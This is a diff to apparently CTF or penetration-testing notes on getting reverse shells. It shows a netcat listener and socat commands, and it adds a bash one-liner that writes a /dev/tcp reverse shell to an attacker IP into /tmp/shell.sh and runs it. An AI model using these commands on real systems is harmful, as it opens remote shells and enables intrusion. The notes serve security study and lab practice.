@@ -129,7 +129,7 @@ But you can also exploit the registration form where the "Username already exist
       
       On listener ---
       $ nc -nlvp [listener port]
-      
+            
 - **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))
 
       On target ---
@@ -139,6 +139,14 @@ But you can also exploit the registration form where the "Username already exist
       $ socat TCP-L:[port] FILE:`tty`,raw,echo=0
       
 - **Metasploit**: sometimes banned from CTF environments
+
+In case not working, this is because you are in a non executable folder. Try to change folder to `/tmp` and create a bash script:
+
+      echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
+      
+      Then:
+
+      bash /tmp/shell.sh
 
 All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
